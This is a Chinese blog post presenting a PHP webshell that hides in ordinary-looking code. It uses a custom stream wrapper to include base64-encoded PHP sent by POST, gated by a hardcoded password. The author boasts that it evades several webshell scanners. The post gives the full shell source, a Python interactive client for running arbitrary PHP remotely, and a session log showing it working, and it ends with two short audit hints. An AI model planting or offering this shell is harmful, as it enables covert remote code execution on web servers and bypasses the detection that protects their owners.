---
title: '非正常 PHP Shell - 产生Shell的一种新方法'  
date: 2018-07-03 10:02:44
tags: 
    - PHP
    - '网络安全'
categories:
    - '技术分享'
---

安全狗绕过是一个比较热门的话题？反正我这边这个`Shell` 经过 安全狗、https://scanner.baidu.com 、http://n.shellpub.com 的检测，没检测出来，美滋滋。

## 检测结果
- http://n.shellpub.com/zip/tid/6b86f122-0392-404b-a660-41ef11b38e15.html
- https://scanner.baidu.com/#/pages/scan_result?hash=fe0c44bd777ef0f9bae897ed79f3d4b9

<!-- more -->

## 产生原理

通过PHP函数 `stream_wrapper_register` 注册包装器，检测特定的URL包装功能，监控 `include` 流，在 `include` 流中动态生成PHP代码，本来是用来做PHP源代码加密的，但是想了下，好像这种方式还没有被安全狗检测，翻阅了大部分安全狗的检测机制，讲道理没有看到有关的文献。具体原理参考我的上一篇文章，不打算菜刀适配（其实是菜刀的运行原理我看起来头晕）。

## Shell代码 

代码稍微有些长，适合隐藏在正常的文件中使用


```php
<?php

/**
 * 异形 Shell，一串看似完全正常代码
 * @author dxkite <dxkite@qq.com>
 * @link //dxkite.cn
 */

class ShellStream
{
    protected $position;
    protected $code;

    public function stream_open($path, $mode, $options, &$opened_path)
    {
        $url = parse_url($path);
        $name = $url["host"];
        $this->code = base64_decode($name);
        $this->position = 0;
        return true;
    }

    public function stream_read($count)
    {
        $ret = substr($this->code, $this->position, $count);
        $this->position += strlen($ret);
        return $ret;
    }

    public function stream_tell()
    {
        return $this->position;
    }

    public function stream_eof()
    {
        return $this->position >= strlen($this->code);
    }

    public function stream_seek($offset, $whence)
    {
        switch ($whence) {
            case SEEK_SET:
                if ($offset < strlen($this->code) && $offset >= 0) {
                    $this->position = $offset;
                    return true;
                } else {
                    return false;
                }
                break;

            case SEEK_CUR:
                if ($offset >= 0) {
                    $this->position += $offset;
                    return true;
                } else {
                    return false;
                }
                break;
            case SEEK_END:
                if (strlen($this->code) + $offset >= 0) {
                    $this->position = strlen($this->code) + $offset;
                    return true;
                } else {
                    return false;
                }
                break;

            default:
                return false;
        }
    }
    public function stream_stat()
    {
        return [];
    }

    public static function shell(){
        if (isset($_POST['password']) && $_POST['code']) {
            stream_wrapper_register('shell', ShellStream::class);
            if ($_POST['password']=='dxkite') {
                $code = $_POST['code'];
                include 'shell://'.$code;
            } else {
                include 'shell://PD9waHAgZWNobyAiaGVsbG8gaGFjayI7';
            }
        }
    }
}

ShellStream::shell();
```

## 利用脚本

不打算做菜刀适配，本文仅供安全研究

```python
import requests 
import base64
import sys


def send_raw(url,password,cmd):
    res=requests.post(url,{
        'password':password,
        'code': base64.b64encode(cmd.encode('utf-8')) 
    })
    return res.text

def send_php_shell(url,password,cmd):
    return send_raw(url,password,'<?php '+cmd)

if __name__ == '__main__':
    if len(sys.argv) <= 1:
        print('Usage:\r\n\tpython shell.py url password')
        sys.exit(0)
    url = sys.argv[1]
    password =sys.argv[2]
    while True:
        cmd = input('php-shell>')
        if cmd == 'exit':
            break
        elif cmd.startswith('run'):
            cmd,path = cmd.split(' ',1)
            code = ''
            with open(path) as f:
                for line in f:
                    code = code + line + "\r\n" 
            response = send_raw(url,password,code);
            print(response)
        else:
            response = send_php_shell(url,password,cmd);
            print(response)
```

## 使用实例

```
PS D:\Server\Local\suda\public\assets\eval> python .\shell.py 'http://suda.atd3.org/assets/eval/shell.php' dxkite
php-shell>echo 'hello,dxkite';
hello,dxkite
php-shell>echo __FILE__;
D:\Server\Local\suda\public\assets\eval\6070fc111c81737d263f97471b4f31ee.shell
php-shell>exit
PS D:\Server\Local\suda\public\assets\eval>
```

## 代码审计避免此类Shell

- 接受了外部输入
- 注册了孤岛式的流包装器
